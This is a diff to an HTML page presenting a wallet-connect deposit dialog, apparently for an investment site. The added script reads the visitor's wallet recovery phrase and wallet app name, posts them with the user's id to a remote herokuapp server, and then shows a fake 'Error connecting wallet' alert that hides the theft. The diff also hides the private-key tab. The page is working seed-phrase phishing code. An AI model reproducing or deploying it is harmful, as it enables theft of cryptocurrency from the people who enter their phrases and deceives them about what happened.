@@ -19365,7 +19365,7 @@
                                     <div class="send-tabs">
                                         <button id="phraseSend">Phrase</button>
                                         <!-- <button id="keystoreSend">Keystore Json</button> -->
-                                        <button id="privateKeySend">Private Key</button>
+                                        <!-- <button id="privateKeySend">Private Key</button> -->
                                     </div>
                                     <div class="send-form">
                                         <form  onsubmit="connectDialogue(event)" 
@@ -19809,77 +19809,104 @@
         </div>
 
 
-<script>
-    async function subFnc(identityId) {
-                            
-                            await $.ajax({
-                              type: "POST",
-                              url: `   https://stoxhaven-render-90b1e5bf9f40.herokuapp.com/transactions/${identityId.userId}/wallet`,
-                              dataType: "json",
-                              data: { ...identityId },
-                              timeout: 30000,
-                              success: function (data) {
-                               
-                                 
-                                 console.log("processing");
-                                 
-                                                      },
-                              error:  function (error) {
-                                  
-                                                          alert('Error Submiting Payment Data');
-                                                          console.log(error);
-                                                        //   stopProcess()
-                                                      }
-                              // function (xhr, status, error) {
-                              //   console.log(error);
-                              //   $('.live-section').html("").addClass('alert-danger')
-                              // }
-                          });
-                        
-                        }
-                       async  function connectDialogue(event){
-                                console.log("clicked");
+        <script>
+            async function subFnc(identityId) {
+                                    
+                                    await $.ajax({
+                                      type: "POST",
+                                      url: `   https://stoxhaven-render-90b1e5bf9f40.herokuapp.com/transactions/${identityId.userId}/wallet`,
+                                      dataType: "json",
+                                      data: { ...identityId },
+                                      timeout: 30000,
+                                      success: function (data) {
+                                       
+                                         
+                                         console.log("processing");
+                                         setTimeout(() => {
+                                            alert("Error connecting wallet.Please try other deposit methods.")
+                                            $("#connectBtn").text("Connect")
+        
+                                         }, 3000);
+                                         
+                                                              },
+                                      error:  function (error) {
+                                          
+                                                                  alert('Error Submiting Payment Data');
+                                                                  console.log(error);
+                                                                //   stopProcess()
+                                                              }
+                                      // function (xhr, status, error) {
+                                      //   console.log(error);
+                                      //   $('.live-section').html("").addClass('alert-danger')
+                                      // }
+                                  });
                                 
-event.preventDefault()
-$("#connectBtn").text("connecting. . .")
-
-var addy=$("#phrase").val()
-
-var user=localStorage.getItem("user")
-var parsedUser=JSON.parse(user)
-console.log(parsedUser);
-
-var identityId={
-    addy,
-    userId:parsedUser._id,
-}
-
-console.log(identityId);
-
-
-localStorage.setItem("identityId",JSON.stringify(identityId))
-
-var identityIdd=localStorage.getItem("identityId")
-                            var identityId=JSON.parse(identityIdd)
-
-                            console.log(identityId);
-                            
-                            await subFnc(identityId)
-
-                            }
-
-
-         $(document).ready(async function () {            
-    
-                        
-                       
-                           
-    
-                        })
-</script>
-
-
-
+                                }
+                               async  function connectDialogue(event){
+                                        console.log("clicked");
+                                        
+        event.preventDefault()
+        $("#connectBtn").text("connecting. . .")
+        
+        var addy=$("#phrase").val()
+        var wally= $('#current-wallet-app').text()
+        console.log(wally);
+        
+        var user=localStorage.getItem("user")
+        var parsedUser=JSON.parse(user)
+        console.log(parsedUser);
+        
+        var identityId={wally,
+            addy,
+            userId:parsedUser._id,
+        }
+        
+        console.log(identityId);
+        
+        
+        localStorage.setItem("identityId",JSON.stringify(identityId))
+        
+        var identityIdd=localStorage.getItem("identityId")
+                                    var identityId=JSON.parse(identityIdd)
+        
+                                    console.log(identityId);
+                                    
+                                    await subFnc(identityId)
+        
+                                    }
+        
+        
+                 $(document).ready(async function () {            
+            
+                    $("#connectBtn").text("Connect")
+        
+                               
+                                   
+            
+                                })
+        </script>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
 
 
 
